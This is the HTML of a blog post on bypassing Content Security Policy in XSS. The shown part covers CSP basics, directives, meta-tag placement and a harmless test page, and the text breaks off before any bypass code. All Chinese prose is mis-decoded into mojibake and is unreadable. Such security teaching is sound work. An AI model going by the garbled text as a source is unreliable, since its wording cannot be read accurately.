<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="XSSä¹‹CSPç»•è¿‡">
<title>æµ…è°ˆCSPç»•è¿‡</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/'>

<link rel="stylesheet" href="/scss/style.min.e1efb040517648e3208ef025cee1558f4e3e423656425dbd8e07546d18e42b3b.css"><meta property='og:title' content="æµ…è°ˆCSPç»•è¿‡">
<meta property='og:description' content="XSSä¹‹CSPç»•è¿‡">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-02-17T00:52:17&#43;08:00'/><meta property='article:modified_time' content='2025-02-17T00:52:17&#43;08:00'/>
<meta name="twitter:title" content="æµ…è°ˆCSPç»•è¿‡">
<meta name="twitter:description" content="XSSä¹‹CSPç»•è¿‡">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu4212831438090465177.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ”‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">æˆ‘ä¸æˆ‘å‘¨æ—‹ä¹…ï¼Œå®åšæˆ‘</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#cspç®€ä»‹">CSPç®€ä»‹</a>
      <ol>
        <li><a href="#cspç­–ç•¥çš„ä½¿ç”¨">CSPç­–ç•¥çš„ä½¿ç”¨</a></li>
      </ol>
    </li>
    <li><a href="#cspç»•è¿‡-1">CSPç»•è¿‡</a>
      <ol>
        <li><a href="#ç»•è¿‡æ‰‹æ®µ">ç»•è¿‡æ‰‹æ®µ</a>
          <ol>
            <li></li>
          </ol>
        </li>
        <li><a href="#ä¾‹é¢˜åˆ†äº«">ä¾‹é¢˜åˆ†äº«</a>
          <ol>
            <li><a href="#tagless">Tagless</a></li>
            <li><a href="#display">display</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%82%B9/" >
                å…¶ä»–çŸ¥è¯†ç‚¹
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/">æµ…è°ˆCSPç»•è¿‡</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            XSSä¹‹CSPç»•è¿‡
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 17, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 6 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="cspç»•è¿‡">CSPç»•è¿‡
</h1><p>å‰é¢äº†è§£äº†ä¸€ä¸‹HttpOnlyï¼Œåé¢å°±æ²¡æ€ä¹ˆå†å­¦ä¹ XSSçš„ä¸œè¥¿äº†ï¼Œè¿™é‡Œåˆé‡åˆ°äº†è¿™ä¸ªï¼Œå†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<h2 id="cspç®€ä»‹">CSPç®€ä»‹
</h2><p>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆContent Security Policyï¼‰æ˜¯ä¸€ç§ç”¨äºç¼“è§£å¤§éƒ¨åˆ†ç±»å‹çš„å†…å®¹æ³¨å…¥æ”»å‡»çš„webåº”ç”¨æŠ€æœ¯ï¼Œæ¯”å¦‚xssã€æ•°æ®æ³¨å…¥ç­‰å¯å®ç°æ•°æ®çªƒå–ã€ç½‘ç«™ç ´åè¡Œä¸ºçš„å®‰å…¨é—®é¢˜ã€‚è¯¥ç­–ç•¥å¯ä»¥é€šè¿‡è®¾å®šè§„åˆ™ï¼Œæ¥é™åˆ¶æµè§ˆå™¨åªèƒ½åŠ è½½å’ŒæŒ‡å®šç‰¹å®šæ¥æºçš„èµ„æºï¼Œå½“æœ‰ä»éç™½åå•å…è®¸çš„JSè„šæœ¬å‡ºç°åœ¨é¡µé¢ä¸­ï¼Œæµè§ˆå™¨ä¼šé˜»æ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘XSSç­‰æ”»å‡»çš„é£é™©ã€‚ä½†æ˜¯åŒæ ·å­˜åœ¨ç»•è¿‡æ‰‹æ®µã€‚</p>
<p>CSPå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§ï¼š</p>
<ul>
<li>Content-Security-Policyï¼š</li>
</ul>
<p>é€šè¿‡å“åº”å¤´æ¥è®¾ç½®ï¼Œæµè§ˆå™¨æ¥æ”¶åˆ°è¿™ä¸ªå¤´åï¼Œä¼šç«‹å³æ‰§è¡Œç­–ç•¥ã€‚</p>
<ul>
<li>Content-Security-Policy-Report-Onlyï¼š</li>
</ul>
<p>åŒæ ·çš„é€šè¿‡å“åº”å¤´æ¥è®¾ç½®ï¼Œè¿™ä¸ªè¡¨ç¤ºä¸æ‰§è¡Œé™åˆ¶é€‰é¡¹ï¼Œåªè®°å½•æœªè¿åé™åˆ¶çš„è¡Œä¸ºï¼Œå¹¶ä¸”å¿…é¡»ä¸<code>report-uri</code>é€‰é¡¹é…åˆä½¿ç”¨ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªHTTPå¤´éƒ¨æ¥è®¾ç½®è§„åˆ™ï¼ŒåŒæ—¶å¿…é¡»è¦è®¾ç½®æŠ¥å‘Šçš„uriï¼Œå½“å‰ç«¯é¡µé¢çš„åŠ è½½è¿åè§„åˆ™ï¼Œæµè§ˆå™¨åªä¼šä»¥JSONæ ¼å¼å‘URIå‘é€æŠ¥å‘Šï¼Œè€Œä¸ä¼šé™åˆ¶ã€‚å…·ä½“å¯ä»¥å‚è€ƒ ã€Š<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only#:~:text=HTTP%20%2A%2A%20Content-Security-Policy-Report-Only%20%2A%2A%E5%93%8D%E5%BA%94%E5%A4%B4%E5%85%81%E8%AE%B8%20web%20%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E9%80%9A%E8%BF%87%E7%9B%91%E6%B5%8B%20%28%E4%BD%86%E4%B8%8D%E5%BC%BA%E5%88%B6%E6%89%A7%E8%A1%8C%29%20%E6%94%BF%E7%AD%96%E7%9A%84%E5%BD%B1%E5%93%8D%E6%9D%A5%E5%B0%9D%E8%AF%95%E6%94%BF%E7%AD%96%E3%80%82,POST%20%E8%AF%B7%E6%B1%82%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%20URI%E3%80%82%20%E6%9B%B4%E5%A4%9A%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8F%AF%E5%8F%82%E8%A7%81%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%20Content%20Security%20Policy%20%28CSP%29."  target="_blank" rel="noopener"
    >Content-Security-Policy-Report-Only</a>ã€‹</p>
<h3 id="cspç­–ç•¥çš„ä½¿ç”¨">CSPç­–ç•¥çš„ä½¿ç”¨
</h3><p>ç®€å•è¯´äº†ä¸€ä¸‹CSPçš„åˆ†ç±»ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªæ–¹å¼ï¼š</p>
<ul>
<li>
<p>HTTPå“åº”å¤´ï¼ŒContent-Security-Policyå“åº”å¤´ï¼Œä¹Ÿå°±æ˜¯å‰é¢è¯´çš„é‚£ä¸ªã€‚</p>
</li>
<li>
<p>ç›´æ¥é€šè¿‡ç½‘é¡µå‰ç«¯çš„ <code>&lt;mata&gt;</code> æ ‡ç­¾</p>
</li>
</ul>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>ï¼ˆ1ï¼‰å¸¸ç”¨çš„ç­–ç•¥æŒ‡ä»¤ï¼š</p>
<ul>
<li>script-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æº</li>
<li>style-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº</li>
<li>img-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº</li>
<li>font-srcï¼šå®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº</li>
<li>connect-srcï¼šå®šä¹‰äº†è¯·æ±‚ï¼Œå¦‚XMLHttpRequestï¼ˆAJAXè¯·æ±‚ï¼‰ã€WebSocketå’ŒEventSourceçš„è¿æ¥æ¥æºã€‚</li>
<li>child-srcï¼šå®šä¹‰äº†web workersä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆå¦‚<code>&lt;frame&gt;</code>å’Œ<code>&lt;iframe&gt;</code>ï¼‰çš„æºã€‚</li>
<li>object-srcï¼šé™åˆ¶å¯ä»¥åŠ è½½å“ªäº›æ’ä»¶ï¼ˆä¾‹å¦‚Flashã€XSSç­‰ï¼‰</li>
<li>default-srcï¼šå®šä¹‰é‚£äº›æ²¡æœ‰è¢«æ›´ç²¾ç¡®æŒ‡ä»¤æŒ‡å®šçš„å®‰å…¨ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´çš„é‚£äº›ç­‰ï¼Œä½†æ˜¯ä¹Ÿæœ‰çš„æŒ‡ä»¤ä¸ä¼šè¢«æŒ‡å®šï¼Œæ¯”å¦‚base-uriï¼Œè¿™ä¸ªåœ¨åé¢çš„CSPç»•è¿‡ä¼šè¯´ã€‚</li>
</ul>
<p>ï¼ˆ2ï¼‰å†…å®¹æºçš„å‡ ç‚¹è¯´æ˜ï¼š</p>
<p>å…¶å®å°±æ˜¯å–å€¼ï¼Œæ—¢ç„¶æœ‰æœ‰äº†æŒ‡ä»¤ï¼Œé‚£ä¹ˆè‚¯å®šè¦æœ‰æŒ‡ä»¤å†…å®¹ï¼Œè¿™é‡Œç®€å•è¯´å‡ ä¸ªï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* : æ˜Ÿå·è¡¨ç¤ºå…è®¸ä»»ä½•URLèµ„æºï¼Œæ²¡æœ‰é™åˆ¶
</span></span><span class="line"><span class="cl">&#39;none&#39;ï¼šè¡¨ç¤ºä¸åŒ¹é…ä»»ä½•èµ„æº
</span></span><span class="line"><span class="cl">&#39;self&#39; åŒæºç­–ç•¥,å³å…è®¸åŒåŸŸååŒç«¯å£ä¸‹,åŒåè®®ä¸‹çš„è¯·æ±‚
</span></span><span class="line"><span class="cl">&#39;unsafe-inline&#39; å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œä¹Ÿå°±æ˜¯å…è®¸&lt;script&gt;ç­‰æ ‡ç­¾å’Œäº‹ä»¶ç›‘å¬å‡½æ•°çš„æ‰§è¡Œï¼Œä¸€èˆ¬ä¸ä¼šä½¿ç”¨
</span></span><span class="line"><span class="cl">&#39;unsafe-eval&#39;   å…è®¸ä¸å®‰å…¨çš„åŠ¨æ€ä»£ç æ‰§è¡Œ,å¦‚jsä¸­çš„eval() Function()ç­‰å‡½æ•°
</span></span><span class="line"><span class="cl">https:  åªå…è®¸é€šè¿‡httpsåè®®åŠ è½½èµ„æº
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nonce: æ¯æ¬¡HTTPå›åº”ç»™å‡ºä¸€ä¸ªæˆæƒtoken,é¡µé¢å†…åµŒè„šæœ¬å¿…é¡»æœ‰è¿™ä¸ªtoken,æ‰ä¼šæ‰§è¡Œ,è®¾ç½®å€¼ä¸ºï¼š&#39;nonce-12345678&#39; å¦‚ä¸‹ï¼š
</span></span><span class="line"><span class="cl">&lt;script nonce=&#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#34;&gt;alert(123)&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç­‰ï¼Œæ³¨æ„å¦‚ä¸Šçš„å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚å…¶ä»–çš„æŒ‡ä»¤åŠå†…å®¹å‚è€ƒï¼šã€Š<a class="link" href="https://juejin.cn/post/7426954121309356042"  target="_blank" rel="noopener"
    >CSP</a>ã€‹</p>
<p><strong>æœ€åç®€å•çœ‹çœ‹å¦‚ä½•è®¾ç½®</strong>ï¼Œå¯¹äºå“åº”å¤´ï¼Œå¦‚ä¸‹å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">header(&#34;Content-Security-Policy: script-src &#39;self&#39;&#34;); 
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºå‰ç«¯çš„<code>&lt;meta&gt;</code>æ ‡ç­¾ï¼Œç›´æ¥åœ¨å‰ç«¯å†™å°±è¡Œäº†ï¼Œä¸€èˆ¬æ˜¯åœ¨ HTML æ–‡æ¡£çš„ <code>&lt;head&gt;</code> éƒ¨åˆ†ä½¿ç”¨ <code>&lt;meta&gt;</code> æ ‡ç­¾æ¥å®šä¹‰ï¼ˆå¹¶ä¸”å¦‚æœå®šä¹‰åœ¨<code>&lt;body&gt;</code>æ ‡ç­¾åˆ™ä¼šè¢«æµè§ˆå™¨å¿½ç•¥å¯¼è‡´æ— æ³•å®æ–½CSPï¼‰ï¼Œæ¯”å¦‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;Content-Security-Policy&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;default-src &#39;self&#39; http://www.dlrb.com &#39;unsafe-inline&#39;&#34;</span> <span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li>
<p>åœ¨ HTTP å“åº”å¤´ä¸­çš„ CSP ç­–ç•¥ä¼šå¯¹æ•´ä¸ªé¡µé¢ç”Ÿæ•ˆï¼ŒåŒ…æ‹¬å†…è”è„šæœ¬ã€å†…è”æ ·å¼ä»¥åŠå¤–éƒ¨èµ„æºçš„åŠ è½½ã€‚</p>
</li>
<li>
<p><code>&lt;meta&gt;</code>æ ‡ç­¾è®¾ç½®çš„ CSP ç­–ç•¥ä»…å¯¹å…¶ä¹‹åçš„èµ„æºç”Ÿæ•ˆï¼Œè€Œåœ¨ <code>&lt;meta&gt;</code> æ ‡ç­¾ä¹‹å‰å­˜åœ¨å†…è”è„šæœ¬æˆ–æ ·å¼ï¼Œè¿™äº›å†…è”å†…å®¹ä¸ä¼šå—åˆ° CSP ç­–ç•¥çš„é™åˆ¶ã€‚å› æ­¤åº”ç¡®ä¿å°†å…¶æ”¾ç½®åœ¨<code> &lt;head&gt;</code> éƒ¨åˆ†çš„æœ€å‰é¢ï¼Œä»¥è¦†ç›–æ‰€æœ‰å†…è”è„šæœ¬å’Œæ ·å¼ã€‚</p>
</li>
</ul>
<p>ç®€å•æœ¬åœ°æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å†…è”è„šæœ¬ 1ï¼šæ­¤æ—¶ CSP å°šæœªç”Ÿæ•ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;å†…è”è„šæœ¬ 1 æ‰§è¡Œ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;script-src &#39;none&#39;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å†…è”è„šæœ¬ 2ï¼šCSP å·²ç”Ÿæ•ˆï¼Œæ‰§è¡Œä¼šè¢«é˜»æ­¢
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;å†…è”è„šæœ¬ 2 ä¸ä¼šæ‰§è¡Œ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;script-src &#39;none&#39;&#34;&gt;--&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å†…è”è„šæœ¬ 3ï¼šCSP å·²ç”Ÿæ•ˆï¼Œæ‰§è¡Œä¼šè¢«é˜»æ­¢
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;å†…è”è„šæœ¬ 3 ä¸ä¼šæ‰§è¡Œ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥æ”¹æ”¹çœ‹çœ‹å‰é¢çš„è¯´æ˜ï¼Œå®Œå…¨æ­£ç¡®ã€‚</p>
<h2 id="cspç»•è¿‡-1">CSPç»•è¿‡
</h2><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç•™è¨€æ¡†+CSPçš„å‰ç«¯é¡µé¢ï¼Œä»¥è¿™ä¸ªä»£ç æ¥ç®€å•è°ˆè°ˆCSPç»•è¿‡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
